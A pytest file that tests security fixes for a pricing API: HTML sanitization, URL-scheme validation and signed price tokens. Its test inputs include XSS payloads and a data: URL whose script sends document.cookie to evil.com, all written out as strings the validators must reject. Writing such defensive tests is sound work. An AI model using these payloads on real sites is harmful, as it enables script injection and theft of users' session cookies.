"""
Day 6: Pricing Gap Fix Tests

Tests for the security gap fixes:
- GAP-6-1: localStorage data tampering
- GAP-6-3: Server-side price validation
- GAP-6-4: Input sanitization
- GAP-6-5: URL validation
"""

import pytest


# ── Input Sanitization Tests (GAP-6-4) ────────────────────────────────

class TestInputSanitization:
    """Tests for sanitize_input function."""

    def test_removes_html_tags(self):
        """Should remove HTML tags from input."""
        from backend.app.api.pricing import sanitize_input
        
        result = sanitize_input("<script>alert('xss')</script>Hello")
        assert "<script>" not in result
        assert "</script>" not in result

    def test_escapes_html_entities(self):
        """Should escape HTML entities."""
        from backend.app.api.pricing import sanitize_input
        
        result = sanitize_input("<b>Bold</b>")
        assert "&lt;" in result or "<" not in result

    def test_truncates_long_input(self):
        """Should truncate input to max_length."""
        from backend.app.api.pricing import sanitize_input
        
        long_input = "A" * 200
        result = sanitize_input(long_input, max_length=50)
        assert len(result) == 50

    def test_handles_empty_input(self):
        """Should handle empty input."""
        from backend.app.api.pricing import sanitize_input
        
        assert sanitize_input("") == ""
        assert sanitize_input(None) == ""


# ── URL Validation Tests (GAP-6-5) ────────────────────────────────────

class TestURLValidation:
    """Tests for validate_url function."""

    def test_accepts_valid_http_url(self):
        """Should accept valid http:// URL."""
        from backend.app.api.pricing import validate_url
        
        result = validate_url("http://example.com")
        assert result == "http://example.com"

    def test_accepts_valid_https_url(self):
        """Should accept valid https:// URL."""
        from backend.app.api.pricing import validate_url
        
        result = validate_url("https://example.com/path?query=1")
        assert result == "https://example.com/path?query=1"

    def test_rejects_javascript_url(self):
        """Should reject javascript: URL."""
        from backend.app.api.pricing import validate_url
        
        with pytest.raises(ValueError) as exc_info:
            validate_url("javascript:alert(1)")
        assert "javascript:" in str(exc_info.value)

    def test_rejects_data_url(self):
        """Should reject data: URL."""
        from backend.app.api.pricing import validate_url
        
        with pytest.raises(ValueError) as exc_info:
            validate_url("data:text/html,<script>alert(1)</script>")
        assert "data:" in str(exc_info.value)

    def test_rejects_file_url(self):
        """Should reject file: URL."""
        from backend.app.api.pricing import validate_url
        
        with pytest.raises(ValueError) as exc_info:
            validate_url("file:///etc/passwd")
        assert "file:" in str(exc_info.value)

    def test_rejects_url_without_protocol(self):
        """Should reject URL without http/https protocol."""
        from backend.app.api.pricing import validate_url
        
        with pytest.raises(ValueError) as exc_info:
            validate_url("example.com")
        assert "must start with" in str(exc_info.value).lower()

    def test_handles_empty_url(self):
        """Should handle empty URL."""
        from backend.app.api.pricing import validate_url
        
        assert validate_url("") == ""
        assert validate_url(None) == ""

    def test_rejects_too_long_url(self):
        """Should reject URL longer than 2000 characters."""
        from backend.app.api.pricing import validate_url
        
        long_url = "https://example.com/" + "a" * 2000
        with pytest.raises(ValueError) as exc_info:
            validate_url(long_url)
        assert "too long" in str(exc_info.value).lower()


# ── Token Generation Tests (GAP-6-1, GAP-6-3) ────────────────────────

class TestValidationToken:
    """Tests for validation token generation."""

    def test_generates_token_with_correct_format(self):
        """Token should have signature:expires_at format."""
        from backend.app.api.pricing import _generate_validation_token
        
        data = {
            "industry": "ecommerce",
            "variants": [{"id": "ecom-order", "quantity": 2}],
            "total_monthly": 198,
        }
        token, expires_at = _generate_validation_token(data)
        
        # Token should contain two parts separated by colon
        parts = token.split(":")
        assert len(parts) == 2
        # First part is hex signature (64 chars for SHA256)
        assert len(parts[0]) == 64
        # Second part is expires_at timestamp
        assert int(parts[1]) == expires_at

    def test_different_data_produces_different_token(self):
        """Different pricing data should produce different tokens."""
        from backend.app.api.pricing import _generate_validation_token
        
        data1 = {
            "industry": "ecommerce",
            "variants": [{"id": "ecom-order", "quantity": 1}],
            "total_monthly": 99,
        }
        data2 = {
            "industry": "ecommerce",
            "variants": [{"id": "ecom-order", "quantity": 2}],
            "total_monthly": 198,
        }
        
        token1, _ = _generate_validation_token(data1)
        token2, _ = _generate_validation_token(data2)
        
        assert token1 != token2

    def test_expires_at_is_in_future(self):
        """Token expiration should be in the future."""
        import time
        from backend.app.api.pricing import _generate_validation_token, TOKEN_VALIDITY_SECONDS
        
        data = {
            "industry": "ecommerce",
            "variants": [{"id": "ecom-order", "quantity": 1}],
            "total_monthly": 99,
        }
        _, expires_at = _generate_validation_token(data)
        
        now = int(time.time())
        assert expires_at > now
        assert expires_at <= now + TOKEN_VALIDITY_SECONDS + 1


# ── Security Integration Tests ────────────────────────────────────────

class TestSecurityIntegration:
    """Integration tests for security fixes."""

    def test_xss_payload_sanitized(self):
        """XSS payloads should be sanitized in 'others' industry fields."""
        from backend.app.api.pricing import sanitize_input
        
        xss_payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "<svg onload=alert(1)>",
        ]
        
        for payload in xss_payloads:
            sanitized = sanitize_input(payload)
            # None of these should be able to execute
            assert "<script>" not in sanitized
            assert "onerror=" not in sanitized
            assert "<svg" not in sanitized or "onload=" not in sanitized

    def test_phishing_url_rejected(self):
        """Phishing URLs should be rejected."""
        from backend.app.api.pricing import validate_url
        
        phishing_urls = [
            "javascript:alert(document.cookie)",
            "data:text/html,<script>document.location='http://evil.com/'+document.cookie</script>",
            "file:///etc/passwd",
            "vbscript:msgbox(1)",
        ]
        
        for url in phishing_urls:
            with pytest.raises(ValueError):
                validate_url(url)
